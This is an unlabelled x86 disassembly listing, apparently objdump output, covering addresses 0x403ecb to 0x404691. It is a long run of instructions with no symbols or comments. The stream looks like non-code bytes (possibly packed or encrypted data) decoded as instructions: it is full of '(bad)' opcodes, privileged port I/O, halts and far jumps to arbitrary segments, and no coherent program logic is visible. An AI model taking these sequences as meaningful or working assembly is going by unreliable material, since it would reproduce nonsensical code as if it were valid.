  403ecb:	ins    DWORD PTR es:[edi],dx
  403ecc:	sahf   
  403ecd:	ins    BYTE PTR es:[edi],dx
  403ece:	mov    ecx,0xc5b32f3c
  403ed3:	inc    esp
  403ed4:	xor    al,0xf5
  403ed6:	xor    BYTE PTR [edi+0x8c17aa7],ch
  403edc:	call   0x5d6b:0x92810b58
  403ee3:	sbb    esi,DWORD PTR [ebx+0x4c6cc9e6]
  403ee9:	(bad)  
  403eea:	aam    0xd0
  403eec:	rcl    DWORD PTR [ebp-0x58],0x98
  403ef0:	adc    BYTE PTR [edx+0x6e19f982],bl
  403ef6:	(bad)  
  403ef7:	loope  0x403eec
  403ef9:	arpl   WORD PTR [esi],bx
  403efb:	inc    eax
  403efc:	mov    ebp,gs
  403efe:	push   ds
  403eff:	mov    ebp,0x612b9bbf
  403f04:	(bad)  
  403f05:	sbb    BYTE PTR [edx+0x52],bh
  403f08:	jp     0x403f65
  403f0a:	retf   0xa60d
  403f0d:	push   ebx
  403f0e:	xchg   BYTE PTR [ebx+0x2a],ah
  403f11:	out    dx,eax
  403f12:	xor    eax,0xd4f159b0
  403f17:	shl    ah,cl
  403f19:	inc    ebx
  403f1a:	dec    edx
  403f1b:	mov    DWORD PTR [ebx-0x34],edi
  403f1e:	aad    0x61
  403f20:	push   eax
  403f21:	push   cs
  403f22:	mov    ds:0x6489a9c0,eax
  403f27:	push   0xffffff97
  403f29:	jle    0x403f4a
  403f2b:	push   es
  403f2c:	xor    BYTE PTR [eax],bh
  403f2e:	pop    edi
  403f2f:	jmp    0x458e:0xe2ec1b5e
  403f36:	bound  ebx,QWORD PTR [esi-0x7676da85]
  403f3c:	jle    0x403f05
  403f3e:	fstp   QWORD PTR [ebx+eiz*1-0x30]
  403f42:	shr    DWORD PTR [eax+0x68],cl
  403f45:	cmp    eax,0xaf5ea2ab
  403f4a:	test   ebx,0xad57a775
  403f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f51:	jbe    0x403f81
  403f53:	sub    DWORD PTR [edi+ebx*1-0x3f],edx
  403f57:	mov    cl,0xbb
  403f59:	and    al,0x8
  403f5b:	cmp    cl,cl
  403f5d:	mov    esp,0x5baaa6cd
  403f62:	jo     0x403fbe
  403f64:	adc    eax,0x9ab9dccc
  403f69:	fsub   QWORD PTR [eax+0x54]
  403f6c:	(bad)  
  403f6d:	xchg   esi,eax
  403f6e:	cdq    
  403f6f:	in     al,0x67
  403f71:	fist   WORD PTR [esi]
  403f73:	mov    ch,0xf4
  403f75:	popa   
  403f76:	xor    eax,0xdbc25a16
  403f7b:	or     DWORD PTR [ecx+0x467591f9],ebx
  403f81:	jb     0x403f19
  403f83:	adc    DWORD PTR [eax],ebp
  403f85:	mov    bh,0x3
  403f87:	out    0x9c,al
  403f89:	mov    ecx,0xdccd3640
  403f8e:	sahf   
  403f8f:	add    dh,BYTE PTR ss:[eax]
  403f92:	dec    edx
  403f93:	jae    0x403f30
  403f95:	sbb    BYTE PTR [ecx-0x4df13c94],al
  403f9b:	ja     0x403f68
  403f9d:	lods   eax,DWORD PTR ds:[esi]
  403f9e:	inc    ebp
  403f9f:	dec    ebx
  403fa0:	cmp    al,0xbb
  403fa2:	xchg   ebx,eax
  403fa3:	adc    ecx,DWORD PTR [ecx+eiz*4]
  403fa6:	add    DWORD PTR [ebx],edi
  403fa8:	call   0xf2ecaaeb
  403fad:	sub    edx,ebp
  403faf:	and    al,0xb
  403fb1:	mov    dh,0xc3
  403fb3:	xor    bh,BYTE PTR [ebp-0x4]
  403fb6:	mov    cs,WORD PTR [ebp-0x71]
  403fb9:	aam    0xc8
  403fbb:	sar    BYTE PTR [edi+0x2b],cl
  403fbe:	inc    esp
  403fbf:	mov    ah,0x11
  403fc1:	pop    ebx
  403fc2:	xchg   edx,eax
  403fc3:	inc    esi
  403fc4:	or     al,0x15
  403fc6:	mov    ds:0x3cd72be9,al
  403fcb:	xor    eax,0xf128d0a8
  403fd0:	mov    cl,0x76
  403fd2:	fild   QWORD PTR [edx+0x37a853db]
  403fd8:	lods   eax,DWORD PTR ds:[esi]
  403fd9:	cmp    BYTE PTR ds:0xf10b0925,dl
  403fdf:	test   DWORD PTR [edi],0x110488e1
  403fe5:	dec    esi
  403fe6:	xchg   DWORD PTR [edi],eax
  403fe8:	push   eax
  403fe9:	in     al,0xb9
  403feb:	lea    edi,[ebp-0x40]
  403fee:	mov    bh,0x4a
  403ff0:	lds    esp,FWORD PTR [ecx]
  403ff2:	jp     0x403fae
  403ff4:	sbb    BYTE PTR [edx+eiz*2-0x19b84ea0],cl
  403ffb:	leave  
  403ffc:	jb     0x404035
  403ffe:	aas    
  403fff:	mov    bl,0x9c
  404001:	div    BYTE PTR [edi-0x7b]
  404004:	mov    ecx,0x9a8d48a
  404009:	into   
  40400a:	push   ebx
  40400b:	arpl   WORD PTR [ebx-0x68],sp
  40400e:	int    0x49
  404010:	mov    al,0x7b
  404012:	cmp    esp,DWORD PTR [edx+ebx*4-0x54]
  404016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404017:	loopne 0x40408e
  404019:	mov    eax,0xdc4d4204
  40401e:	loop   0x40405e
  404020:	mov    ebp,DWORD PTR [edi]
  404022:	sub    ecx,esp
  404024:	jbe    0x404010
  404026:	jne    0x404002
  404028:	test   DWORD PTR [ebp+0x7f184193],0xa971e3ee
  404032:	or     BYTE PTR [ebp-0x7],dl
  404035:	push   cs
  404036:	lods   eax,DWORD PTR ds:[esi]
  404037:	dec    eax
  404038:	pop    edi
  404039:	mov    edx,0xd50b4d9b
  40403e:	ret    0xffb7
  404041:	pop    es
  404042:	out    0x13,eax
  404044:	aam    0x46
  404046:	fcom   st(0)
  404048:	jns    0x404097
  40404a:	add    BYTE PTR [edi],dl
  40404c:	mov    bh,0x6e
  40404e:	lock sbb dh,bh
  404051:	mov    bh,BYTE PTR [esi-0x2]
  404054:	icebp  
  404055:	and    BYTE PTR [edi+0x44],ah
  404058:	sub    al,0x7a
  40405a:	daa    
  40405b:	pop    ss
  40405c:	ins    DWORD PTR es:[edi],dx
  40405d:	fwait
  40405e:	ret    0xa042
  404061:	(bad)  
  404062:	stc    
  404063:	test   dl,0xde
  404066:	pop    edi
  404067:	push   eax
  404068:	mov    bl,0x3f
  40406a:	inc    ecx
  40406b:	jmp    0x4040e3
  40406d:	sub    esp,eax
  40406f:	cmp    edi,DWORD PTR [bp+si-0x762]
  404074:	pop    esi
  404075:	gs xor edi,esp
  404078:	in     eax,0xa2
  40407a:	pushf  
  40407b:	pop    ebx
  40407c:	xchg   ecx,eax
  40407d:	jl     0x404050
  40407f:	loope  0x40406b
  404081:	ret    
  404082:	mov    bh,0xa8
  404084:	out    0x3e,eax
  404086:	loopne 0x404086
  404088:	and    DWORD PTR [si-0x76],esp
  40408c:	mov    ch,0x27
  40408e:	push   ebp
  40408f:	inc    eax
  404090:	cmp    ebp,DWORD PTR [edi+0x162b613d]
  404096:	jge    0x4040fe
  404098:	lods   al,BYTE PTR ds:[esi]
  404099:	xor    al,BYTE PTR ds:0x207ee7cc
  40409f:	inc    edi
  4040a0:	pop    esi
  4040a1:	sbb    DWORD PTR [ebx+0x77],eax
  4040a4:	in     al,0xeb
  4040a6:	inc    edi
  4040a7:	adc    DWORD PTR [edi],eax
  4040a9:	mov    cl,0xda
  4040ab:	add    BYTE PTR [edx-0x670d7523],ah
  4040b1:	fdivr  QWORD PTR [eax+0x57]
  4040b4:	fbstp  TBYTE PTR [esi+0x26]
  4040b7:	and    dl,ah
  4040b9:	pop    DWORD PTR [ebx+edx*1-0x61637904]
  4040c0:	loope  0x404121
  4040c2:	mov    ah,BYTE PTR [esi+0x7c]
  4040c5:	enter  0xf27f,0xdf
  4040c9:	push   esp
  4040ca:	push   es
  4040cb:	push   eax
  4040cc:	and    DWORD PTR [esi+0x35],edi
  4040cf:	jle    0x40406d
  4040d1:	sbb    eax,0x3c30b1f6
  4040d6:	sub    bl,BYTE PTR [edi+0x5e]
  4040d9:	and    al,0xf9
  4040db:	(bad)  
  4040dc:	jns    0x4040bc
  4040de:	push   ds
  4040df:	xor    DWORD PTR [edx-0x6a37bfeb],0xffffff90
  4040e6:	mov    eax,0xcd31a61e
  4040eb:	int    0xb6
  4040ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040ee:	adc    BYTE PTR [edx],cl
  4040f0:	jl     0x404105
  4040f2:	sub    eax,0xdf118cbf
  4040f7:	test   al,0xbb
  4040f9:	adc    DWORD PTR [esi+esi*8],esp
  4040fc:	enter  0xf069,0x19
  404100:	repnz sub esi,esp
  404103:	neg    BYTE PTR [ecx-0x51]
  404106:	add    bh,BYTE PTR [eax-0x31]
  404109:	out    dx,eax
  40410a:	je     0x404156
  40410c:	cmp    ch,BYTE PTR [edx]
  40410e:	gs push esp
  404110:	sbb    bl,cl
  404112:	lods   al,BYTE PTR ds:[esi]
  404113:	sub    BYTE PTR [edx],cl
  404115:	push   edi
  404116:	push   ds
  404117:	leave  
  404118:	dec    esp
  404119:	push   ecx
  40411a:	push   0xd67a0df
  40411f:	stos   DWORD PTR es:[edi],eax
  404120:	mov    al,ds:0xfe5b89ad
  404125:	mov    al,ds:0x191ac9d8
  40412a:	or     al,0xa0
  40412c:	lea    ebp,[eax+esi*8]
  40412f:	mov    fs,esp
  404131:	fdivr  QWORD PTR [edx+0x5e]
  404134:	in     eax,dx
  404135:	inc    ebp
  404136:	loop   0x4040d8
  404138:	stc    
  404139:	mov    ebx,esp
  40413b:	xlat   BYTE PTR ds:[ebx]
  40413c:	sti    
  40413d:	pop    ds
  40413e:	push   eax
  40413f:	sub    al,0xd5
  404141:	pop    ebp
  404142:	jne    0x404149
  404144:	push   esi
  404145:	or     DWORD PTR [ebx],0x5e
  404148:	xchg   esi,eax
  404149:	and    dl,BYTE PTR [esi+0x34]
  40414c:	jmp    0xcb1c617f
  404151:	ds xchg esp,eax
  404153:	jle    0x404149
  404155:	fdivr  QWORD PTR [ebx-0x53]
  404158:	push   esp
  404159:	jmp    0x3816:0xbe9a106
  404160:	addr16 jg 0x404165
  404163:	(bad)  
  404164:	out    0xc,al
  404166:	jmp    0x404101
  404168:	sub    eax,0xcc2b28cf
  40416d:	dec    esi
  40416e:	push   ss
  40416f:	mov    ah,0x7a
  404171:	pop    edi
  404172:	nop
  404173:	gs and al,0x25
  404176:	add    ch,BYTE PTR [ebx+0x29]
  404179:	pop    ebp
  40417a:	pop    esi
  40417b:	dec    eax
  40417c:	pop    esp
  40417d:	and    DWORD PTR [ebx-0x6f064bdd],esi
  404183:	jo     0x4041ba
  404185:	retf   0x172a
  404188:	shl    BYTE PTR [ebx+0x60ab64ac],0xdf
  40418f:	retf   0xc37a
  404192:	in     al,dx
  404193:	hlt    
  404194:	aam    0xff
  404196:	sbb    DWORD PTR [ebx-0x52710134],ebp
  40419c:	or     ebx,edx
  40419e:	sbb    cl,BYTE PTR [edi-0x5c]
  4041a1:	mov    ecx,0x14576d0f
  4041a6:	stos   BYTE PTR es:[edi],al
  4041a7:	push   ebx
  4041a8:	data16 jg 0x40414c
  4041ab:	push   esp
  4041ac:	ins    DWORD PTR es:[edi],dx
  4041ad:	sbb    BYTE PTR [esi],al
  4041af:	cmp    BYTE PTR [esi],ah
  4041b1:	dec    esi
  4041b2:	mov    ah,0x2c
  4041b4:	xchg   edx,eax
  4041b5:	imul   esp,DWORD PTR [ecx+0x3a],0xd58d5bcd
  4041bc:	enter  0x3aed,0xa8
  4041c0:	or     bh,BYTE PTR ds:0xe077f012
  4041c6:	cmp    bl,BYTE PTR [edx-0x2c9d4b67]
  4041cc:	mov    edx,0x22ca8c88
  4041d1:	je     0x4041be
  4041d3:	push   edi
  4041d4:	pop    edi
  4041d5:	xchg   DWORD PTR [edx+0x35],ecx
  4041d8:	mov    eax,ds:0x2e9854bc
  4041dd:	sbb    ebp,DWORD PTR [ebp-0x20ab6a0d]
  4041e3:	rcl    DWORD PTR [edx-0x2f],0xda
  4041e7:	mov    dh,0xe8
  4041e9:	mov    esi,0x44f68a40
  4041ee:	aas    
  4041ef:	pushf  
  4041f0:	pop    esp
  4041f1:	(bad)  
  4041f3:	repz repnz out 0x7d,eax
  4041f7:	fucom  st(4)
  4041f9:	adc    ch,dl
  4041fb:	push   edx
  4041fc:	inc    ecx
  4041fd:	xchg   BYTE PTR [ecx+eax*8+0x4dea590],cl
  404204:	jo     0x404221
  404206:	jmp    0x978:0xdaa22b5c
  40420d:	inc    esi
  40420e:	shl    esi,0x43
  404211:	mov    WORD PTR [esi+esi*4+0x4d],ss
  404215:	sbb    al,0x1a
  404217:	mov    eax,ds:0x5b6a05b7
  40421c:	dec    ecx
  40421d:	arpl   WORD PTR [ebp-0x300c07f7],dx
  404223:	outs   dx,BYTE PTR ds:[si]
  404225:	inc    ebx
  404226:	(bad)  
  404227:	dec    ecx
  404228:	sbb    al,0x64
  40422a:	push   ebp
  40422b:	out    0x7f,eax
  40422d:	jne    0x404217
  40422f:	fucomi st,st(5)
  404231:	pusha  
  404232:	stos   DWORD PTR es:[edi],eax
  404233:	jmp    0x4a93:0x5bb0c3d
  40423a:	push   cs
  40423b:	aas    
  40423c:	mov    bh,0xe4
  40423e:	xchg   ecx,eax
  40423f:	mov    ch,0xea
  404241:	int    0x6a
  404243:	fwait
  404244:	jmp    0x2212:0xcca3cded
  40424b:	sub    ebp,eax
  40424d:	cmp    eax,0x1d43361b
  404252:	mov    esp,0x2f5d753a
  404257:	fadd   DWORD PTR [esi+0x12]
  40425a:	xchg   ebp,eax
  40425b:	rcr    ah,cl
  40425d:	pop    edi
  40425e:	lock fwait
  404260:	das    
  404261:	mov    edi,0xdb1f20ce
  404266:	imul   esp,DWORD PTR [esi],0x70aaaca3
  40426c:	xchg   esp,eax
  40426d:	imul   ebp,edx,0x1c6e4fd4
  404273:	repz mov ds:0xd6775217,al
  404279:	inc    esi
  40427a:	pop    esp
  40427b:	and    BYTE PTR [ecx+0x7503dab0],ah
  404281:	popa   
  404282:	(bad)  
  404283:	jmp    0x3528:0xda9e9238
  40428a:	mov    al,ds:0xac1d36fa
  40428f:	test   BYTE PTR [edi-0x7e],cl
  404292:	pop    eax
  404293:	out    dx,eax
  404294:	sar    edx,1
  404296:	xchg   esp,eax
  404297:	sbb    al,0xd0
  404299:	ja     0x40430f
  40429b:	sbb    DWORD PTR [eax+0x66eabe5f],ebx
  4042a1:	lds    esp,FWORD PTR ds:0x85b06160
  4042a7:	in     al,0xd0
  4042a9:	cli    
  4042aa:	mov    edx,eax
  4042ac:	pop    esi
  4042ad:	jnp    0x4042e8
  4042af:	scas   eax,DWORD PTR es:[edi]
  4042b0:	xchg   ebx,eax
  4042b1:	mov    ds:0xa8d5a89b,eax
  4042b6:	jno    0x404240
  4042b8:	xor    ah,BYTE PTR [eax-0x27d0f658]
  4042be:	xchg   ecx,eax
  4042bf:	(bad)  
  4042c0:	jno    0x404281
  4042c2:	pushf  
  4042c3:	pop    es
  4042c4:	cdq    
  4042c5:	vdivsd xmm6,xmm7,QWORD PTR [ebx-0x21ea2c34]
  4042cd:	cwde   
  4042ce:	enter  0x81fa,0x96
  4042d2:	dec    edi
  4042d3:	out    dx,al
  4042d4:	ds and eax,0xe9d2847c
  4042da:	and    ebx,esp
  4042dc:	or     BYTE PTR ds:0xb3173b93,al
  4042e2:	das    
  4042e3:	stos   DWORD PTR es:[di],eax
  4042e5:	mov    ch,0xff
  4042e7:	cmp    edx,DWORD PTR [edi+0x74]
  4042ea:	(bad)  
  4042eb:	sub    ecx,eax
  4042ed:	sbb    BYTE PTR [ecx+0x411d9628],bl
  4042f3:	adc    eax,0xb8d0f82c
  4042f8:	stos   DWORD PTR es:[edi],eax
  4042f9:	outs   dx,DWORD PTR ds:[esi]
  4042fa:	cmc    
  4042fb:	jp     0x40437c
  4042fd:	hlt    
  4042fe:	xchg   ecx,eax
  4042ff:	xchg   ecx,eax
  404300:	test   BYTE PTR [esi-0x5573d6f2],bl
  404306:	retf   0xfa89
  404309:	(bad)  
  40430a:	icebp  
  40430b:	popa   
  40430c:	add    esi,DWORD PTR cs:[eax]
  40430f:	xchg   DWORD PTR [ecx],ecx
  404311:	iret   
  404312:	inc    esi
  404313:	std    
  404314:	les    edi,FWORD PTR [ecx]
  404316:	xchg   esp,eax
  404317:	imul   edx,DWORD PTR [edi],0xbf3ded1e
  40431d:	call   0x6485:0x6fa42819
  404324:	sbb    ch,BYTE PTR [eax-0x7]
  404327:	and    BYTE PTR [esi-0x21a44aec],al
  40432d:	dec    sp
  40432f:	sub    BYTE PTR [ebx],ch
  404331:	xchg   DWORD PTR [edi],esp
  404333:	test   eax,0x83940541
  404338:	push   ebx
  404339:	mov    dl,0xe5
  40433b:	shr    BYTE PTR [eax],cl
  40433d:	xchg   edx,eax
  40433e:	push   edi
  40433f:	int    0x70
  404341:	ds add esi,edx
  404344:	imul   edi,DWORD PTR [edi+0x67],0xe6db5aa0
  40434b:	jmp    0x4043ca
  40434d:	push   ss
  40434e:	loope  0x4043c7
  404350:	dec    esp
  404351:	nop
  404352:	test   BYTE PTR [ebx],cl
  404354:	mov    al,ds:0xcfb5e1f3
  404359:	hlt    
  40435a:	pop    ebp
  40435b:	or     al,0xf7
  40435d:	rcl    DWORD PTR [edx+ebx*4+0x604d32aa],1
  404364:	mov    ah,0x65
  404366:	das    
  404367:	hlt    
  404368:	out    dx,al
  404369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40436a:	lock call 0x1a7f:0x1836df2
  404372:	jne    0x404367
  404374:	cli    
  404375:	push   cs
  404376:	pop    ecx
  404377:	(bad)  
  404378:	jecxz  0x4043ee
  40437a:	and    BYTE PTR gs:[edx+0x4ae67546],ch
  404381:	out    dx,eax
  404382:	(bad)  
  404384:	mov    bl,BYTE PTR [eax]
  404386:	int    0xd5
  404388:	jp     0x4043d5
  40438a:	pushw  0xffe8
  40438d:	add    al,0xd1
  40438f:	imul   eax,DWORD PTR [bx],0xcdaf5ce4
  404396:	or     al,BYTE PTR [esi]
  404398:	dec    ebp
  404399:	pop    ds
  40439a:	adc    ebp,eax
  40439c:	lds    esp,FWORD PTR [eax+0x40]
  40439f:	mov    eax,ds:0x405fe2f7
  4043a4:	inc    ecx
  4043a5:	call   0x27a9:0x5cbd9c4
  4043ac:	stos   DWORD PTR es:[edi],eax
  4043ad:	rcr    DWORD PTR [esi],0xb9
  4043b0:	pusha  
  4043b1:	mov    edi,0xad15d978
  4043b6:	fwait
  4043b7:	sbb    eax,0x9e1b97af
  4043bc:	dec    esp
  4043bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043be:	xchg   ah,bh
  4043c0:	icebp  
  4043c1:	sbb    al,0x17
  4043c3:	or     al,0x69
  4043c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043c6:	rol    DWORD PTR cs:[ebx],1
  4043c9:	mov    edx,edx
  4043cb:	loop   0x404440
  4043cd:	(bad)  
  4043ce:	jl     0x40442a
  4043d0:	xchg   ebx,eax
  4043d1:	lea    edx,[ebx+0x9eae8b3]
  4043d7:	shr    ebx,1
  4043d9:	cmp    DWORD PTR [ecx-0x5e],0xffffffd2
  4043dd:	sbb    bh,BYTE PTR [ebp-0x5a31adc2]
  4043e3:	push   DWORD PTR ds:0x3ce3a80b
  4043e9:	adc    al,BYTE PTR [edx]
  4043eb:	aaa    
  4043ec:	pop    es
  4043ed:	adc    ecx,DWORD PTR [ecx-0x45]
  4043f0:	gs in  eax,0xb8
  4043f3:	in     eax,0xc0
  4043f5:	gs xor al,0x41
  4043f8:	lea    edx,[eax-0x4bb992b6]
  4043fe:	popa   
  4043ff:	xor    BYTE PTR [eax+ebp*4+0x79],dl
  404403:	iret   
  404404:	clc    
  404405:	fcomi  st,st(2)
  404407:	repz inc ebx
  404409:	mov    dh,0x94
  40440b:	mov    cl,0x21
  40440d:	sub    BYTE PTR ds:0x1fd067e8,dh
  404413:	iret   
  404414:	mov    edi,0x6546ab2b
  404419:	jle    0x4043c4
  40441b:	mov    ebp,0x8b818958
  404420:	rol    BYTE PTR [edx],cl
  404422:	dec    ecx
  404423:	cmp    eax,0x431ba60c
  404428:	stos   BYTE PTR es:[edi],al
  404429:	add    edx,DWORD PTR [edx-0x728a365f]
  40442f:	arpl   dx,bx
  404431:	inc    edi
  404432:	repnz sbb cl,ah
  404435:	pop    edx
  404436:	pop    es
  404437:	xchg   BYTE PTR [ebp-0x17],bl
  40443a:	lods   al,BYTE PTR ds:[esi]
  40443b:	jb     0x4043f9
  40443d:	push   es
  40443e:	mov    dl,0xab
  404440:	outs   dx,BYTE PTR ds:[esi]
  404441:	arpl   bx,dx
  404443:	xchg   esp,eax
  404444:	pop    eax
  404445:	and    DWORD PTR [ebx+0xa756a62],edi
  40444b:	test   eax,0x66147597
  404450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404451:	imul   esp,DWORD PTR [edx-0x3cf25927],0xc7ac88b2
  40445b:	add    eax,0x98972e0a
  404460:	push   edx
  404461:	sbb    BYTE PTR [ebp-0x40],bl
  404464:	sub    dl,BYTE PTR [ebp-0x61b6214f]
  40446a:	cmp    bh,BYTE PTR [eax-0x34]
  40446d:	leave  
  40446e:	(bad)  
  40446f:	rcl    BYTE PTR [ebp-0x20],cl
  404472:	dec    ebp
  404473:	push   esi
  404474:	les    esp,FWORD PTR [eax]
  404476:	fimul  DWORD PTR [ecx+0x15]
  404479:	inc    esp
  40447a:	add    eax,0xc765383d
  40447f:	xor    BYTE PTR [ebp-0x3b],ch
  404482:	and    DWORD PTR [edi+0x2c570ca2],ebx
  404488:	gs in  al,dx
  40448a:	dec    esp
  40448b:	pusha  
  40448c:	std    
  40448d:	sbb    BYTE PTR [edx+0x628c3ca],cl
  404493:	push   0xffffffcd
  404495:	xor    esp,esi
  404497:	cmp    eax,DWORD PTR [edi-0x37d94a71]
  40449d:	hlt    
  40449e:	or     BYTE PTR [esi+0x69],bh
  4044a1:	push   ds
  4044a2:	adc    cl,BYTE PTR [esi+0x33e4f7af]
  4044a8:	jb     0x40448c
  4044aa:	xchg   BYTE PTR [ebp-0x1],dh
  4044ad:	dec    ebp
  4044ae:	sbb    al,0xfd
  4044b0:	pusha  
  4044b1:	repz pushf 
  4044b3:	fwait
  4044b4:	jmp    FWORD PTR [ecx+0x677d38a1]
  4044ba:	mov    eax,0xfc648818
  4044bf:	es pop esp
  4044c1:	dec    ebx
  4044c2:	adc    ecx,ebp
  4044c4:	ja     0x404522
  4044c6:	sub    edx,edi
  4044c8:	xor    ebp,ebp
  4044ca:	adc    ebp,ebp
  4044cc:	jnp    0x40447d
  4044ce:	scas   al,BYTE PTR es:[edi]
  4044cf:	mov    edi,0xde5c7bf3
  4044d4:	inc    ebx
  4044d5:	jno    0x4044f9
  4044d7:	into   
  4044d8:	adc    ecx,ebp
  4044da:	mov    eax,0xd838d3ea
  4044df:	xchg   edi,eax
  4044e0:	push   esi
  4044e1:	arpl   WORD PTR [ecx+0x7991754f],bp
  4044e7:	add    al,0xcb
  4044e9:	iret   
  4044ea:	inc    ebp
  4044eb:	shl    edi,cl
  4044ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044ee:	ja     0x4044fa
  4044f0:	(bad)  
  4044f1:	int3   
  4044f2:	inc    esi
  4044f3:	pop    edi
  4044f4:	or     eax,0x808914d1
  4044f9:	add    ch,BYTE PTR [ebx+0x6a]
  4044fc:	std    
  4044fd:	pop    edx
  4044fe:	mov    al,0x4e
  404500:	nop
  404501:	cmp    eax,0x12f0fb74
  404506:	mov    bl,0xb6
  404508:	mov    eax,0xceaa1909
  40450d:	jp     0x40455e
  40450f:	xchg   bh,cl
  404511:	in     al,0x71
  404513:	out    dx,al
  404514:	xchg   edx,eax
  404515:	jo     0x4044d2
  404517:	pop    ebx
  404518:	mov    ch,bh
  40451a:	mov    al,BYTE PTR [ebp+0x28b2623]
  404520:	sub    ebx,0xffffffb0
  404523:	jno    0x404510
  404525:	fst    QWORD PTR [edi-0x8]
  404528:	jg     0x40456d
  40452a:	mov    bl,0x7d
  40452c:	out    dx,al
  40452d:	mov    al,ds:0xaa8c2d84
  404532:	pop    ecx
  404533:	loop   0x4044e4
  404535:	out    dx,eax
  404536:	jns    0x40456d
  404538:	(bad)  
  404539:	cld    
  40453a:	sub    edi,edx
  40453c:	or     DWORD PTR [ecx],ecx
  40453e:	cs hlt 
  404540:	mov    ch,0xce
  404542:	mov    eax,ds:0x142cf393
  404547:	std    
  404548:	inc    ebx
  404549:	sti    
  40454a:	inc    eax
  40454b:	sti    
  40454c:	jno    0x40453d
  40454e:	iret   
  40454f:	aam    0xfe
  404551:	xchg   esp,eax
  404552:	in     eax,0xec
  404554:	leave  
  404555:	test   DWORD PTR [ecx-0x6],esp
  404558:	scas   eax,DWORD PTR es:[edi]
  404559:	xchg   sp,ax
  40455b:	add    DWORD PTR [ebp-0x4a46d6ad],esi
  404561:	inc    edx
  404562:	das    
  404563:	idiv   BYTE PTR [ecx-0x33]
  404566:	stos   BYTE PTR es:[edi],al
  404567:	jnp    0x4044e9
  404569:	xchg   ebx,eax
  40456a:	cwde   
  40456b:	xadd   BYTE PTR [eax],bh
  40456e:	push   ebp
  40456f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404570:	test   al,0x42
  404572:	mov    BYTE PTR [ecx],dl
  404574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404575:	js     0x404585
  404577:	dec    ebp
  404578:	jge    0x404564
  40457a:	mov    ds:0x6951e66,eax
  40457f:	and    al,0xe2
  404581:	test   al,0xc1
  404583:	xchg   esi,eax
  404584:	mov    cl,0x5e
  404586:	jns    0x4045f8
  404588:	mov    eax,ds:0xec78196a
  40458d:	sbb    esi,0xc812f6d3
  404593:	mov    esi,0x52722e9a
  404598:	and    eax,0xb024ef66
  40459d:	cmp    bl,cl
  40459f:	pop    es
  4045a0:	hlt    
  4045a1:	mov    ch,0xf5
  4045a3:	stos   BYTE PTR es:[edi],al
  4045a4:	mov    bh,0x4a
  4045a6:	mov    edi,0x4139954
  4045ab:	xchg   BYTE PTR [edi+edi*2+0x2a],cl
  4045af:	lds    ecx,FWORD PTR [edi+edx*4-0x2b11f91e]
  4045b6:	clc    
  4045b7:	and    cl,BYTE PTR [ecx+eax*2]
  4045ba:	aas    
  4045bb:	mov    al,ds:0xd541b4df
  4045c0:	mov    dh,0x9e
  4045c2:	lods   al,BYTE PTR ds:[esi]
  4045c3:	or     al,0x70
  4045c5:	rcl    cl,1
  4045c7:	push   es
  4045c8:	fwait
  4045c9:	ss popa 
  4045cb:	sbb    DWORD PTR [ebx+edi*8+0x601ffcdd],0xa1f42a9e
  4045d6:	mov    ebp,0x79098ab0
  4045db:	xor    ebp,DWORD PTR [edx-0x22b4c303]
  4045e1:	fstp   DWORD PTR [edx]
  4045e3:	test   esp,edi
  4045e5:	pop    edi
  4045e6:	pushf  
  4045e7:	mov    ebp,0x83a4e661
  4045ec:	sub    eax,DWORD PTR [eax-0x565fc83c]
  4045f2:	data16 jae 0x404582
  4045f5:	(bad)  
  4045f6:	frstor [ecx+ebp*4-0x6036bc6f]
  4045fd:	(bad)  
  4045fe:	jge    0x4045c0
  404600:	aad    0xd0
  404602:	(bad)  
  404604:	and    BYTE PTR [ebx],cl
  404606:	stos   BYTE PTR es:[edi],al
  404607:	sbb    bl,BYTE PTR [esi-0x7a949d9a]
  40460d:	leave  
  40460e:	loope  0x4045ea
  404610:	icebp  
  404611:	aad    0xe9
  404613:	mov    al,ds:0x4d36e7f6
  404618:	inc    edi
  404619:	inc    ebx
  40461a:	lods   eax,DWORD PTR ds:[esi]
  40461b:	das    
  40461c:	sub    BYTE PTR [edx],bl
  40461e:	ins    DWORD PTR es:[edi],dx
  40461f:	adc    dl,BYTE PTR [ecx]
  404621:	or     al,0x89
  404623:	(bad)  
  404624:	pushf  
  404625:	js     0x404678
  404627:	mov    cl,0xfc
  404629:	dec    edi
  40462a:	shl    DWORD PTR [edx],0xfd
  40462d:	push   edx
  40462e:	or     DWORD PTR [edi-0x70692399],ecx
  404634:	dec    edx
  404635:	push   ecx
  404636:	loopne 0x404607
  404638:	add    DWORD PTR [edx],edx
  40463a:	jb     0x404696
  40463c:	aas    
  40463d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40463e:	scas   al,BYTE PTR es:[edi]
  40463f:	push   ebx
  404640:	mov    al,ds:0x58056a5b
  404645:	mov    bl,0xd4
  404647:	pop    esp
  404648:	pop    ecx
  404649:	fsub   QWORD PTR [edi+0x7d]
  40464c:	mov    ss,WORD PTR [ebp+ebx*8+0x6f]
  404650:	ror    BYTE PTR [ebx+0x89d6fb8],0xb2
  404657:	mov    BYTE PTR [eax+0x54],cl
  40465a:	lahf   
  40465b:	xor    ebp,esp
  40465d:	std    
  40465e:	mov    esp,0xa9e48de2
  404663:	scas   eax,DWORD PTR es:[edi]
  404664:	push   es
  404665:	in     eax,dx
  404666:	sbb    al,0xb5
  404668:	xchg   ecx,eax
  404669:	pop    eax
  40466a:	mov    al,0xe0
  40466c:	sbb    cl,dl
  40466e:	fnsave gs:[edx]
  404671:	add    BYTE PTR [eax-0x14],cl
  404674:	js     0x404682
  404676:	cmp    BYTE PTR [esi+eax*1],0xa6
  40467a:	xlat   BYTE PTR ds:[ebx]
  40467b:	or     eax,0x23b4b8ba
  404680:	ret    0xe772
  404683:	jmp    0x4046eb
  404685:	(bad)  
  404686:	into   
  404687:	out    0xe,eax
  404689:	jns    0x404645
  40468b:	jecxz  0x4046f8
  40468d:	pop    ss
  40468e:	add    bh,al
  404690:	in     al,dx
  404691:	push   cs
